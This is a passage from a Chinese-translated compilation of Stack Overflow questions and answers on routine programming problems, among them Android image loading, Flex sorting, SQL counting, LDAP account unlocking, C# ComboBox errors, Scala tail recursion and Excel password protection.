            .setImageDrawable(LoadImageFromWebOperations("http://tmcrmappsqa.inservices.tatamotors.com/cordys/Images/mobile.png"+position));
    return imageView;
}
protected Drawable LoadImageFromWebOperations(String url) {
    try {
        InputStream is = (InputStream) new URL(url).getContent();
        Drawable d = Drawable.createFromStream(is, "src name");
        return d;
    } catch (Exception e) {
        System.exit(0);
        return null;
    }
}

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:32:55.017

你应该检查 url，+position 会导致错误的 url：

```
imageView.setImageDrawable(LoadImageFromWebOperations("http://tmcrmappsqa.inservices.tatamotors.com/cordys/Images/mobile.png"+position));

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:27:57.500

嘿检查你的图片下载网址。你为什么将位置附加到该网址？如果你有很多图片，比如 mobile1、mobile2 等，那么你应该在 mobile 之后而不是 url 之后附加位置。

最重要的是，您不能像现在这样在主 UI 线程上进行网络操作。它可能适用于 GingerBread 和 Pre-GingerBread 设备，但不适用于后来的 GingerBread 设备。

只需参考此[链接](https://github.com/thest1/LazyList)并以这种方式进行即可。

# flex4 - 如何对 DropDownList 组件中的数据进行排序？

> ID：12839407
> 
> 赞同：1
> 
> 时间：2012-10-11T12:20:51.183
> 
> 标签：flex4, flash-builder

我正在开发一个简单的 Web 应用程序，其中包含一些员工的简单数据，例如 ID、NAME 等。因此，我使用 XML 文件作为我的数据库。然而，**我的 XML 文件是按员工 ID 排序的**。

但是，我正在使用*选择员工姓名并显示有关他/她的一些信息，但是当我通过我的 spark 组件创建可绑定数据时（我只是将我的 XML 文件“拖放”到组件中），我想显示那些按名称排序的名称，这是我的问题。*

 *它应该是一个简单的代码，但我遇到了麻烦......哈哈！

```
<s:DropDownList id="ddNome"
                labelField="NomeFuncionario" <!-- Employees' Name -->
                textAlign="justify"
                width="240" height="25"
                top="30" horizontalCenter="0"
                initialize="sortName(event)" <!-- Trying to create it now... -->
                creationComplete="cbNome_creationCompleteHandler(event)"
                change="cbNome_changeHandler(event)">

    <s:AsyncListView list="{getDataResult2.lastResult}"/>

</s:DropDownList> 
```

对于此代码的任何帮助，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T14:34:10.877

你可以试试这样的

```
 <mx:XMLListCollection id="xmlListColl"
            source="{getDataResult2.lastResult}">
        <mx:sort>
            <mx:Sort>
                <mx:fields>
                    <mx:SortField id="sortField"
                            name="@NomeFuncionario"
                            caseInsensitive="true" />
                </mx:fields>
            </mx:Sort>
        </mx:sort>
    </mx:XMLListCollection>

    ...
    <s:AsyncListView list="{xmlListColl}"/>
    ... 
```*

# php - 从动态表中使用 PHP 计数

> ID：12839409
> 
> 赞同：0
> 
> 时间：2012-10-11T12:21:05.000
> 
> 标签：php, mysql, count

我不是 PHP 专家，尽管我一直在处理一些东西，从这里和那里复制和粘贴，我想问一些我找不到的东西，我对如何实施它。

例如，在这样的表中：

```
 +------+-----+
    |NAME  |BIRTH|
    +------+-----+
    |John  |1980 |
    |Carl  |1982 |
    |Alice |1990 |
    |June  |1994 |
    |Rob   |1998 |
    |Alice |1998 |
    |John  |2000 |
    |Alice |2001 |
    |Etc.  |     |
    +------+-----+ 
```

我做了不同的查询，如下所示（我可以继续用任何年份组合进行查询）：

1.  `Select * from table where BIRTH between 1980 and 1990`
2.  `Select * from table where BIRTH between 1980 and 2001`
3.  `Select * from table where BIRTH between 1990 and 2001`

所以我会得到 3 个不同的表，我需要从这些表中计算不同的内容，例如，从使用 query1 获得的表中我需要获取：

```
 John = 1
   Carl = 1
   Alice = 1 
```

从查询表2：

```
 John = 2
   Carl = 1
   Alice = 3
   June = 1
   Rob =1 
```

从查询表3：

```
 Alice = 3
   John = 1
   Carl = 1
   June = 1
   Rob =1 
```

记住大表有 700 条记录，所以它可以出现任何新名称，我需要以同样的方式打印出结果：

```
 Alice = 3
   John = 1
   NewName = 1
   June = 1
   Rob =1 
```

我的最终目标是与获得的表格相关的百分比，而不是与寄存器总数相关的百分比。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:24:43.107

您应该在 SQL 中执行此操作，而不是在 PHP 中：

```
select NAME, count(1)
from TABLE
where condition
group by NAME 
```

这将产生您想要的确切视图。名称作为第一列，计数在第二列。

# java - 运行“sudo R CMD javareconf”得到“找不到任何Java解释器”

> ID：12839411
> 
> 赞同：6
> 
> 时间：2012-10-11T12:21:11.667
> 
> 标签：java, r, ubuntu

我试图为 Eclipse 安装一个插件，但得到一个错误，经过一番谷歌搜索后，得到了运行的建议：sudo R CMD javareconf，但得到了这个错误：

```
*** Cannot find any Java interpreter
*** Please make sure 'java' is on your PATH or set JAVA_HOME correspondingly 
```

顺便说一句，我的 $JAVA_HOME 指向一个 oracle-jdk-7

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:23:17.013

很可能，您的 root 用户没有设置 JAVA_HOME。你绝对需要`sudo`吗？

如果你这样做，你可以使用一个小的 bash 脚本来做到这一点：

```
#!/bin/bash

export JAVA_HOME="<path to jdk>"
R CMD javareconf 
```

保存文件并给它一个类似`myinstall`或类似的名称，执行一个`chmod +x myinstall`和`sudo ./myinstall`

**编辑**

@Mat 指出了一个好点。我改变了我的方法。谢谢！

# javascript - contenteditable 对于简单的数字编辑有多可靠？

> ID：12839412
> 
> 赞同：0
> 
> 时间：2012-10-11T12:21:12.567
> 
> 标签：javascript, jquery, contenteditable, html-table

我们有一个网站，用户可以在其中输入项目的统计信息。统计数据只是 int 或 float 的，不需要格式化。

我们可以将其设置为每个`td`都被替换为`<input type="text" />`，但这需要我们格式化输入，使它们看起来不是输入，这会带来一大堆跨浏览器 css 问题！

所以我们正在研究`contenteditable`，但我想知道我们可能会遇到多少问题？

我们正在考虑使用基本上像这样的实现：http: [//jsfiddle.net/hailwood/XQhh3/](http://jsfiddle.net/hailwood/XQhh3/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:27:08.533

有许多使用这种方法的 HTML 富文本编辑器，您的问题看起来相当简单。如果你只担心客户端问题，兼容性是我能想到的最大问题。[许多](http://caniuse.com/contenteditable)移动浏览器不支持此功能。

如果您的内容比文本节点更复杂，我可以看到您遇到的大多数困难都与 DOM 选择和操作有关，否则您应该没问题。

# java - 解锁 HPUX LDAP Directory Server 中的用户对象

> ID：12839425
> 
> 赞同：2
> 
> 时间：2012-10-11T12:21:46.373
> 
> 标签：java, ldap, openldap, hp-ux

我正在通过我的 java 代码访问 HP UX 目录服务器，以重置和解锁目录服务器中的锁定用户帐户。

这是我的用户帐户密码重置代码。

```
openConnection(details);

loadUserInformation((String)details.get("END_USER_NAME"));

ModificationItem[] mods = new ModificationItem[1];

Attribute mod0 = new BasicAttribute("userpassword", (String)details.get("NEW_PASSWORD"));

mods[0] = new ModificationItem(DirContext.REPLACE_ATTRIBUTE, mod0);

connection.modifyAttributes(user, mods);

closeConnection(); 
```

但是我无法为给定用户进行帐户解锁，因为在我的 LDAP 浏览器中找不到帐户锁定的 LDAP 属性。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T08:29:18.443

看起来 HPUX 目录服务器是红帽目录服务器的克隆。

首先，您要执行哪个解锁？根据您设置密码策略的方式，帐户可能会被不同方面锁定。

如果账户被入侵者检测到锁定，则需要执行以下操作：

```
dn: uid=scarter,ou=people,dc=example,dc=com
changetype: modify
delete: passwordRetryCount
-
delete: accountUnlockTime 
```

-吉姆

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-19T12:20:33.437

正确的答案是首先配置密码策略然后配置子树级别或基于用户的密码策略和帐户锁定策略然后使用户帐户被锁定并尝试以下代码将解锁锁定的帐户。

```
ModificationItem[] mods = new ModificationItem[2];
mods[0] = new ModificationItem(DirContext.REMOVE_ATTRIBUTE, new BasicAttribute("passwordRetryCount"));
mods[1] = new ModificationItem(DirContext.REMOVE_ATTRIBUTE, new BasicAttribute("accountUnlockTime"));
connection.modifyAttributes(user, mods); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:47:31.690

条目的对象类定义了允许的属性。您应该查找条目的对象类并尝试从那里找到正确的属性。

# android - Android：如何在地图视图上绘制？

> ID：12839438
> 
> 赞同：2
> 
> 时间：2012-10-11T12:22:32.760
> 
> 标签：android, google-maps, canvas, paint

我`MapView`通过正确传递经度和纬度参数来获取当前位置。但我想在该图像上像徒手（即名称或线条等）一样绘制油漆`MapView`。从那我想要 `MapView`用户在该油漆上的图像的总图像。我怎样才能做到这一点？

当用户将他的路径发送给另一个用户时，如下所示......

![](../Images/c76f86dfa5e21cca3c00ba762ddc1ff8.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:26:29.930

使用叠加层。 [请参阅此示例叠加层](https://developers.google.com/maps/documentation/android/hello-mapview/#Part2)

这是示例代码：

```
public class overlayGeoPoints  extends Overlay {

    private GeoPoint geoPoint;
    private int radius = 20;

    @Override
    public boolean onTap(GeoPoint geoPoint, MapView mapView){
          this.geoPoint = geoPoint;
    }

    @Override
    public void draw(Canvas canvas, MapView mapView, boolean shadow) {

        // put your logic here to draw on the overlay
        // ie draw a circle
        Projection projection = mapView.getProjection();
        Point point = new Point();
        projection.toPixels(geoPoint, point);

        int px = point.x;
        int py = point.y;
        Paint paint = new Paint(paintSecondary.ANTI_ALIAS_FLAG);
        hl.setColor(intColor);
        canvas.drawCircle(px, py, radius, paint);
        canvas.save();

    }
} 
```

只需将此叠加层添加到您的地图中。

**编辑**

这是一步一步（通用）：

创建地图对象（地图）之后

```
// get a handle to the map overlays
List<Overlay> overlays = mapView.getOverlays();

// reset overlays as necessary
//overlays.clear();

// create your custom overly class
overlayGeoPoints olay = new overlayGeoPoints();

// append overlay to map overlays
overlays.add(olay);

// tell the map object to redraw
mapView.postInvalidate(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T13:41:50.503

如果我正确理解了你的问题，你想捕捉德华运动并在地图上显示。

**脚步：**

*   创建一个扩展 Overlay 的新类
*   覆盖`onTouchEvent()`以获取用户点击并移动手指的位置 (x,y)，将它们转换为地理点并将地理点添加到路径对象。打电话`invalidate()`有地图redrwan。
*   覆盖`onDraw()`以绘制上面的路径构建`canvas.drawPath()`
*   最后，将叠加层添加到 mapView.getOverlays() 的末尾，以确保此叠加层是第一个获取触摸事件的。

祝你好运。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-17T13:52:46.743

```
// This file is MapViewDemoActivity.java
   import android.os.Bundle;
   import android.view.View;

   import com.google.android.maps.MapActivity;
   import com.google.android.maps.MapView;

       public class MapViewDemoActivity extends MapActivity {
        private MapView mapView;

       @Override
          protected void onCreate(Bundle savedInstanceState) {
             super.onCreate(savedInstanceState);
             setContentView(R.layout.mapview);

         mapView = (MapView)findViewById(R.id.mapview);
         mapView.setBuiltInZoomControls(true); //display zoom controls
     }

      @Override
         protected boolean isLocationDisplayed() {
          return false;
     } 
```

这种喜欢对所有[http://n3vrax.wordpress.com/2011/08/13/drawing-overlays-on-android-map-view/都很有用](http://n3vrax.wordpress.com/2011/08/13/drawing-overlays-on-android-map-view/)

# c# - InvalidArgument=“0”的值对“SelectedIndex”无效。参数名称：SelectedIndex

> ID：12839444
> 
> 赞同：6
> 
> 时间：2012-10-11T12:23:10.500
> 
> 标签：c#, .net, xml, winforms

尝试此代码时出现上述错误。我试着[**只给出我的代码**](http://msdn.microsoft.com/en-us/library/h5e30exc.aspx)但没有用。（这是默认的）

[**这是我的 XML 文件**](http://ideone.com/OnpgJ)

错误发生在`cmbProduct_SelectedIndexChanged`事件中。

```
 cmbProduct --> combobox
        cmbBrand   --> combobox 
```

**全球的**

```
 DataSet dsUpdate = new DataSet(); 
```

**表单加载**

```
 dsUpdate.ReadXml(@"...\..\stock.xml");
        cmbProduct.DataSource = dsUpdate.Tables[0]
            .DefaultView.ToTable(true, "productname");//.DefaultView;
        cmbProduct.DisplayMember = "productname";
        cmbProduct.SelectedIndex = 0; 
```

**cmbProduct_SelectedIndexChanged**

```
 cmbBrand.Items.Clear();
        foreach (DataRow Row in dsUpdate.Tables[0].Select("productname='" + cmbProduct.Text + "'"))
        {
            //cmbBrand.SelectedIndex = i;
            cmbBrand.Items.Add(Row["brandname"].ToString());
            //i++;
        } 
        cmbBrand.SelectedIndex = 0; /*ERROR*/ 
```

请帮助
提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-11T12:37:45.973

问题是：

当您启动应用程序时，cmbBrand 中没有项目，但 cmbProduct 会触发 SelectedIndexChanged。

试试这个：

从 Form1.Designer.cs 中删除 SelectedIndexChanged 事件初始化。尝试找到以下行：

```
this.cmbProduct.SelectedIndexChanged += new System.EventHandler(this.cmbProduct_SelectedIndexChanged); 
```

之后，当您使用 xml 文件中的数据填充 DataSet 时，初始化 SelectedIndexChanged 事件：

```
dsUpdate.ReadXml(@"...\..\stock.xml");
cmbProduct.DataSource = dsUpdate.Tables[0].DefaultView.ToTable(true, "productname");//.DefaultView;
cmbProduct.DisplayMember = "productname";
this.cmbProduct.SelectedIndexChanged += new System.EventHandler(this.cmbProduct_SelectedIndexChanged);
cmbProduct.SelectedIndex = 0; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-03-17T06:51:17.467

你也可以试试这个。在设置组合框 DataSource 之前设置它的 BindingContext

```
cmbProduct.BindingContext = this.BindingContext; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-02-23T08:26:43.177

我有同样的错误。我认为这个错误有一些原因。所以我的错误与“`DataSource`在另一个线程中设置不起作用”有关

例子

```
//Run in another thread
myComboBox.DataSource = myDataSource; //not set 
```

修复

```
myComboBox.Invoke(new Action(() => myComboBox.DataSource = myDataSource)); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-11-03T06:01:45.093

如果您在没有有效数据源的情况下尝试设置 SelectedIndex，则会发生这种情况。如果您将默认值重置为 0，并偶尔更改数据源列表，您可能会看到这一点。如果应用新的数据源，则不需要默认为 0，因此简单的检查将避免它发生：

if (comboBox.Datasource != null) comboBox.SelectedIndex = 0;

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-07-05T13:20:06.440

如果你有这个问题：

*   使用**Form_Activated**事件处理程序来控制设置索引。
*   对我来说，我将一系列动态生成的组合框添加到表单中。
*   我列出了我想使用 SetIndex=0 的列表，然后在这个处理程序中遍历它们。
*   当只调用一次 SetIndex 时，我也有一个布尔值 firstFormActivation。
*   您也可以顺便将此方法用于 Focus()，因此 Form 中的第一个字段在动态添加时会获得焦点。

下面是一些代码来说明这一点：

```
 private readonly List<ComboBox> combosToSetIndexOn = new List<ComboBox>();
    private bool firstActivation = true;
    private Control firstWindowsControl = null;

    ...
    // Other code sets firstWindowsControl...

    private void DynamicForm_Activated(object sender, EventArgs e)
    {
        if (firstActivation)
        {
            firstActivation = false;
            bool fwcPresent = (firstWindowsControl != null);
            Console.WriteLine($"DynamicForm_Activated: firstWindowControl present: {fwcPresent}");
            if (fwcPresent)
            {
                firstWindowsControl.Focus();
            }

            if (combosToSetIndexOn.Count > 0)
            {
                foreach (ComboBox c in combosToSetIndexOn)
                {
                    Console.WriteLine($"DynamicForm_Activated: processing: {c.Name}");
                    c.SelectedIndex = 0;
                }
            }
        } 
```

# ruby-on-rails - 在 rails 3 项目中包含机架 oauth2？

> ID：12839448
> 
> 赞同：0
> 
> 时间：2012-10-11T12:23:24.913
> 
> 标签：ruby-on-rails, oauth-2.0

我希望我的 Rails 应用程序充当 oauth2 令牌提供者。

我对 ruby​​ 开发相对较新，但在我看来，基于 Rack 的开发对于这种情况是有益的。

可能吗 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T10:44:49.423

对的，这是可能的。

[https://github.com/applicake/doorkeeper](https://github.com/applicake/doorkeeper) - 用于轻松将您的应用设置为 oauth2 提供程序的 Gem。

# iphone - Cocos2d 中的动画标签并在动画完成后将其删除

> ID：12839450
> 
> 赞同：1
> 
> 时间：2012-10-11T12:23:35.733
> 
> 标签：iphone, objective-c, cocos2d-iphone

我有一个游戏，你必须收集从天上掉下来的东西。抓到一个后，我希望您获得的分数奖励出现，然后慢慢向上移动并淡出。

我发现了如何淡出标签，但不完全确定如何将其向上移动（比如 50 像素）同时淡出它？

```
[label runAction:[CCFadeTo actionWithDuration:1f opacity:0.0f]] 
```

另外，当我在运行中执行此操作时，我应该如何管理内存并在动画完成后删除标签？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:43:36.303

您可以使用 CCSpawn 创建一组操作，这些操作将在您运行 spawn 操作时运行。或者只是一个一个地运行两个动作。我是说

```
[label runAction: fadeActioin];
[label runAction: moveAction]; 
```

# sitecore - 为预设组件选择数据源项

> ID：12839451
> 
> 赞同：4
> 
> 时间：2012-10-11T12:23:37.647
> 
> 标签：sitecore, sitecore6

在深入研究我的解释之前，我将总结我的问题：

***我如何为用户（编辑器）提供一种用户友好的可能性来为在标准值上预设的子布局选择数据源项？***

我的情况如下：

我有一个页面模板，在标准值上有预定义的布局。假设布局包括：

*   一个占位符“包装器”
*   一个子布局“内容”

这个子布局是在我的页面模板上预定义的，但也可以使用页面编辑器放置在占位符中。它需要有一个定义 Title 和 Body 值的数据源项。

现在，如果用户使用页面编辑器将此子布局添加到占位符，他将获得一个很好的界面来选择或创建数据源项（参见屏幕截图）。

![在此处输入图像描述](../Images/26e6f22ba4470576661a1bebc7bd449b.png)

但是，如果子布局是在标准值上预定义的，它将在没有数据源的情况下添加（我无法在标准值中预先设置数据源，因为那时它仍然未知）。

到那时，似乎没有办法进入用于选择或创建数据源项的漂亮界面。

理想情况下，我希望能够向我的模板添加一个字段，该字段可以保存一个数据源项，用户可以使用漂亮的界面选择/创建该数据源项。我查看了数据源字段类型，这可能是另一种选择，但它仍然不是我想要的。

*请记住，内容子布局只是一个示例。我知道在这种特定情况下，如果没有数据源，我可以通过始终将标题/正文字段添加到保存值的模板来解决它，但对于我的现实世界问题，这还不够。*

我对页面编辑器（使用新的工作方式）没有很多经验，所以我想就这个主题获得一些建议。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-11T17:59:50.157

根据你在这里说的：

> 理想情况下，我希望能够向我的模板添加一个字段，该字段可以保存一个数据源项，用户可以使用漂亮的界面选择/创建该数据源项。我查看了数据源字段类型，这可能是另一种选择，但它仍然不是我想要的。

您似乎希望在 CMS shell 中有一个直观的数据源选择器界面，类似于基于页面编辑器的 UI。

**快速回答**：简单地说，在 Sitecore 中没有什么可以为您做这件事。

**更长的答案**：您仍然有一些选择，例如

定义一个全局“虚拟”数据源，并将其设置为模板标准值的 Presentation > Layout Details 中设置的数据源。所以每次你创建一个新页面时，它总是会指向那个虚拟值来显示一些东西。

从这里你可以做一些事情：

1.  如果用户必须使用 shell UI 而不是页面编辑器，他们可以简单地为特定页面创建另一个数据源项，并使用布局详细信息中的现有本机界面更新该页面以指向它。
2.  另一种选择是编写一个事件处理程序，例如`item:created`，当您创建项目时，为该特定页面自动创建相应的数据源项目（无论此自动创建的项目是子项目还是全局项目...... ) 然后以编程方式将其设置为数据源。Nick Wesselman 在这段视频中展示了一个类似的概念：[http ://www.techphoria414.com/Blog/2012/May/Sitecore_Page_Editor_Unleashed](http://www.techphoria414.com/Blog/2012/May/Sitecore_Page_Editor_Unleashed)

# javascript - 将音频录制到互联网 - SoundCloud API？

> ID：12839453
> 
> 赞同：1
> 
> 时间：2012-10-11T12:23:46.693
> 
> 标签：javascript, flash, audio, record, soundcloud

所以我需要允许客户将音频录制到互联网上。到目前为止，我发现将它们保留在我们网站上的最佳解决方案是 Soundcloud API，我只是向他们提供了我们的帐户详细信息，他们使用了一个版本的 Soundcloud 记录器（Flash/Javascript），它们被一起破解用于站点。

主要问题是，这些录音很长。可能长达一个小时。因为 Soundcloud API 在浏览器中记录然后上传音频并在其服务器上转码，所以上传过程中会出现很多问题，这需要很长时间才能处理大文件。如果我们只是以 20 分钟的时间块记录音频，那没关系，但它并不那么可靠。

我们尝试使用 wami-recorder 构建自己的，但这意味着在上传之前在浏览器中将 wav 转码为 MP3 以使文件更小，但在客户端机器上花费更多时间 - 至少 Soundcloud 会在服务器端进行转码。

鉴于文件的大小，我应该查看基于 red5 或其他东西的服务器端记录器/流媒体解决方案，还是上传更好的建议的客户端记录器？

多谢！

# c# - 在 DataTable 数据绑定后附加 GridView-Columns

> ID：12839459
> 
> 赞同：0
> 
> 时间：2012-10-11T12:24:14.337
> 
> 标签：c#, asp.net

我有一个`DataTable` 我在代码文件中创建的，然后我将它绑定到`GridView`我使用 Visual Studio 的拖放功能创建的一个。

但是，我在`GridView`其中添加了一些不受支持的列（如果我错了，请纠正我）`DataTable`，例如 Hyperlink-Column 或 CheckBox-Column。

我想使用`DataTable`从特定列中生成的值派生的值来构建超链接列和复选框 id。我知道我可以使用它`DataNavigateUrlfields`来构建动态链接，但是我该如何使用`DataTable`稍后绑定的呢？

我还需要 中的列出`GridView`现在`DataTable`.

上述任何帮助将不胜感激。任何替代方案也值得赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:53:36.157

以声明方式添加的控件将首先创建，然后是数据绑定/手动创建（记录在[页面的生命周期](http://msdn.microsoft.com/en-us/library/ms178472%28v=vs.80%29.aspx)中，搜索*“以声明方式创建的控件”*）。由于您希望声明性列最后，您需要一个技巧：

您可以使用[`RowDataBound`](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridview.rowdatabound.aspx)更改顺序，以便这些`AutoGenerated`列之后是您的其他列，例如`Hyperlink`或`CheckBox`列：

```
protected void gridOffers_RowDataBound(object sender, GridViewRowEventArgs e)
{
    TableCell cell = e.Row.Cells[0];
    e.Row.Cells.RemoveAt(0);
    //Move first to the end
    e.Row.Cells.Add(cell);
    cell = e.Row.Cells[0];
    e.Row.Cells.RemoveAt(0);
    //Move second to the end
    e.Row.Cells.Add(cell);
} 
```

> 但是，我在 GridView 中添加了一些在 DataTable 中不受支持的列（如果我错了，请纠正我），例如 Hyperlink-Column 或 CheckBox-Column。

它们不需要在 DataTable 中支持，但在 GridView 中。表包含您的数据，网格包含视图。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:54:23.327

您可以尝试使用此代码 - 基于`RowDataBound`

```
<Columns>
       <asp:TemplateField>
              <ItemTemplate>
                  <asp:HyperLink ID="HyperLink1" runat="server" Text=""></asp:HyperLink>
              </ItemTemplate>
       </asp:TemplateField>
       <asp:TemplateField>
              <ItemTemplate>
                  <asp:CheckBox ID="CheckBox1" runat="server" />
              </ItemTemplate>
       </asp:TemplateField>

</Columns> 
```

您可以使用事件 RowDataBound 调整 datbound，我添加了 HyperLink 控件，以便根据需要自定义链接。

```
 void GridView_RowDataBound(Object sender, GridViewRowEventArgs e)
 {
    if(e.Row.RowType == DataControlRowType.DataRow)
    {
      var hyperLink = (HyperLink)e.Item.FindControl("HyperLink1");
      hyperLink.NavigateUrl ="...."; 

      var checkBox = (CheckBox)e.Item.FindControl("CheckBox1");
      checkBox.Checked =....

    }

  } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-12-09T08:38:42.613

如果您使用的是数据表，那么有一种简单的方法来追加列

```
DataTable yourDataTable = new DataTable();

Load yourDataTable by DataReader or DataAdapter

DataColumn newColumn = yourDataTable.Columns.Add("Total", typeof(Int32)); 
```

之后，您可以将此数据表绑定到您的 Gridview 中。 [微软](https://msdn.microsoft.com/en-us/library/hfx3s9wd(v=vs.110).aspx)

# scala - 尾递归和副作用

> ID：12839466
> 
> 赞同：3
> 
> 时间：2012-10-11T12:24:36.037
> 
> 标签：scala, functional-programming, tail-recursion

我实际上正在学习 scala，我有一个关于尾递归的问题。这是 scala 中带有尾递归的阶乘示例：

```
 def factorial(n: Int): Int = {

    @tailrec
    def loop(acc: Int, n: Int): Int = {
      if (n == 0) acc
      else loop(n * acc, n - 1)
    }
    loop(1, n)
  } 
```

我的问题是更新参数，`acc` 因为我们在函数中这样做`loop`可以认为是副作用吗？由于在 FP 中，我们希望防止或减少副作用的风险。

也许我弄错了，但有人可以向我解释这个概念。

谢谢你的帮助

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-11T12:32:46.683

您实际上并没有在此处更改任何参数的值（因为`val`根据定义它们是 s，即使您愿意，也不能这样做）。

您正在*返回一个新值*，该值是根据传入的参数（并且只有那些）计算得出的。正如@om-nom-nom 在他的评论中指出的那样，这是纯函数的定义。

# java - httpcomponents 未按记录工作

> ID：12839473
> 
> 赞同：0
> 
> 时间：2012-10-11T12:24:54.907
> 
> 标签：java, apache-httpclient-4.x

使用我在这里找到的代码：http: [//hc.apache.org/httpcomponents-client-ga/quickstart.html](http://hc.apache.org/httpcomponents-client-ga/quickstart.html)我创建了一个快速的 HTTP 客户端应用程序。这是一个代码片段：

```
DefaultHttpClient httpclient = new DefaultHttpClient();
HttpGet httpGet = new HttpGet(url);
log.info("Logging in");
HttpResponse response;
try {
  response = httpclient.execute(httpGet);
}
catch (ClientProtocolException cpe) {
  String msg = "Error logging in with:" + rootUrl;
  log.error(msg, cpe);
  throw new BusinessRuleException(msg, cpe);
}
catch (IOException ioe) {
  String msg = "Error logging in with:" + rootUrl;
  log.error(msg, ioe);
  throw new BusinessRuleException(msg, ioe);
}

try {
  System.out.println(response.getStatusLine());
  HttpEntity entity = response.getEntity();
  // do something useful with the response body
  // and ensure it is fully consumed
  EntityUtils.consume(entity);
}
catch (IOException ioe) {
  String msg = "Error retrieving login response:" + rootUrl;
  log.error(msg, ioe);
  throw new BusinessRuleException(msg, ioe);
}
finally {
  httpGet.releaseConnection();
} 
```

我得到这个例外：

```
java.lang.NoSuchMethodError: org.apache.http.client.methods.HttpGet.releaseConnection()V
    at com.xerox.tclg.juror.schedule.RestScheduleRunner.runDailyCheckout(RestScheduleRunner.java:93)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.springframework.util.MethodInvoker.invoke(MethodInvoker.java:276)
    at org.springframework.scheduling.quartz.MethodInvokingJobDetailFactoryBean$MethodInvokingJob.executeInternal(MethodInvokingJobDetailFactoryBean.java:260) 
```

我发现一些文档说 releaseConnection() 不是必需的，所以我删除了 finally 块。然后我得到这个异常：

```
java.lang.NoSuchMethodError: org.apache.http.util.EntityUtils.consume(Lorg/apache/http/HttpEntity;)V
    at com.xerox.tclg.juror.schedule.RestScheduleRunner.runDailyCheckout(RestScheduleRunner.java:85)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.springframework.util.MethodInvoker.invoke(MethodInvoker.java:276)
    at org.springframework.scheduling.quartz.MethodInvokingJobDetailFactoryBean$MethodInvokingJob.executeInternal(MethodInvokingJobDetailFactoryBean.java:260) 
```

有人见过这个吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:31:34.443

在这种情况下，`java.lang.NoSuchMethodError`很可能意味着您获得了错误版本的 Http Components JAR 文件之一。

如果您能准确找出“RestScheduleRunner.java:85”中发生的情况，它可能会帮助您诊断问题。

# excel - 为什么修改密码后excel的内容会发生变化？

> ID：12839475
> 
> 赞同：1
> 
> 时间：2012-10-11T12:25:00.640
> 
> 标签：excel, dropbox, password-protection, password-encryption

我通过为excel分配密码来测试它。该 excel 保存在 Dropbox 中，当我为该 excel 分配密码时，它完全下载到与之共享的每个计算机上。有没有办法分配密码并且整个文件不会被修改？我确信这不是 Dropbox 的问题，因为 SugarSync 也发生了这种情况。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:52:37.630

如果没有更深入的内部知识，我仍然会说不 - Excel 必须以某种方式存储你的密码，所以我猜它会被加密并存储在你的文件中，因此二进制会改变它。

只是这样你就可以自己检查一下：

制作一个新的工作簿并保存。

打开它，只需密码保护它，并将其另存为另一个工作簿（就像第一次一样）

现在将它们与任何 HEX 或二进制比较工具进行比较。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-27T00:19:41.647

密码保护意味着文件被加密。如果文件未加密，则密码保护文件毫无意义。防止人们在未加密的情况下查看文件的唯一另一种方法是限制对其的访问。这可以通过以下方式实现：

1) 修改您计算机上的权限，使其只能使用您的受密码保护的帐户查看。

2) 不与其他 Dropbox 用户共享文件（或仅与您想查看的人共享）。

这些都不是一个非常好的安全方法。文件加密总是更安全，理想情况下与上述一起使用。

# asp.net - 为什么 ClientID 在 ASP.Net 3.5 中没有改变

> ID：12839476
> 
> 赞同：2
> 
> 时间：2012-10-11T12:25:01.577
> 
> 标签：asp.net, .net-4.0, .net-3.5, asp.net-4.0, asp.net-3.5

这是奇怪的 ClientID 行为，您可以通过以下步骤重现它：

1.  使用 .net 3.5 创建一个 Web 项目
2.  添加新的 WebUserControl
3.  在控件中添加文本框`<asp:TextBox runat="server" ID="txt1"></asp:TextBox>`
4.  在默认页面中，添加一个 PlaceHolder，`<asp:PlaceHolder runat="server" ID="phTest"></asp:PlaceHolder>`
5.  在后面的代码中，添加：

    ```
    protected override void OnPreRender(EventArgs e)
    {
        var ctl = (WebUserControl1)LoadControl("WebUserControl1.ascx");
        var id = ctl.Txt1.ClientID;
        phTest.Controls.Add(ctl);
